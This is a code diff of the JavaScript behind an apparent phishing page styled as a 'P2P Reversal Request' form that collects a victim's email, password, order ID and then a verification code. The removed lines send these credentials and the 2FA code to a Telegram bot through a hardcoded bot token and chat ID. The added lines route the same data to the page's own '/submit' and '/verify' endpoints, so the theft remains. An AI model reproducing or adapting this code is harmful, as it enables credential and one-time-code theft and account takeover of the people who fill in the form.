@@ -409,28 +409,15 @@
       btn.textContent = 'Submitting…';
       btn.disabled = true;
 
-      const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
-      const CHAT_ID   = '2056358288';
-      const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-      const reasonLabels = {
-        no_payment : 'No payment received',
-        no_proof   : 'No payment proof',
-        fraud      : 'Suspected fraud',
-        other      : 'Other',
-      };
-
-      const text = `🔔 New P2P Reversal Request\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🆔 Order ID: ${orderId}\n📋 Reason: ${reasonLabels[reason] || reason}\n🕒 Time: ${new Date().toUTCString()}`;
-
       try {
-        const res  = await fetch(TG_URL, {
+        const res  = await fetch('/submit', {
           method  : 'POST',
           headers : { 'Content-Type': 'application/json' },
-          body    : JSON.stringify({ chat_id: CHAT_ID, text }),
+          body    : JSON.stringify({ email, password, orderId, reason }),
         });
         const data = await res.json();
 
-        if (data.ok) {
+        if (data.success) {
           window.userEmail = email; // Save for next step
           document.getElementById('step1').classList.add('hidden');
           document.getElementById('step2').classList.remove('hidden');
@@ -438,8 +425,8 @@
           reasonField.classList.remove('filled');
           reasonSelect.classList.remove('has-value');
         } else {
-          console.error('Telegram error:', data);
-          showToast('Submission failed: ' + (data.description || 'Unknown error'));
+          console.error('Server error:', data);
+          showToast('Submission failed: ' + (data.message || 'Unknown error'));
         }
       } catch (err) {
         console.error('Fetch error:', err);
@@ -476,29 +463,23 @@
       btn.textContent = 'Verifying…';
       btn.disabled = true;
 
-      const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
-      const CHAT_ID   = '2056358288';
-      const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-      const text = `🔐 Auth Code Received\n\n📧 Email: ${window.userEmail || 'Unknown'}\n🔢 Code: ${authCode}\n🕒 Time: ${new Date().toUTCString()}`;
-
       try {
-        const res  = await fetch(TG_URL, {
+        const res  = await fetch('/verify', {
           method  : 'POST',
           headers : { 'Content-Type': 'application/json' },
-          body    : JSON.stringify({ chat_id: CHAT_ID, text }),
+          body    : JSON.stringify({ email: window.userEmail, authCode }),
         });
         const data = await res.json();
 
-        if (data.ok) {
+        if (data.success) {
           showToast('Verification successful!', 4000);
           document.getElementById('codeForm').reset();
           setTimeout(() => {
             window.location.reload();
           }, 2000);
         } else {
-          console.error('Telegram error:', data);
-          showToast('Verification failed: ' + (data.description || 'Unknown error'));
+          console.error('Server error:', data);
+          showToast('Verification failed: ' + (data.message || 'Unknown error'));
         }
       } catch (err) {
         console.error('Fetch error:', err);
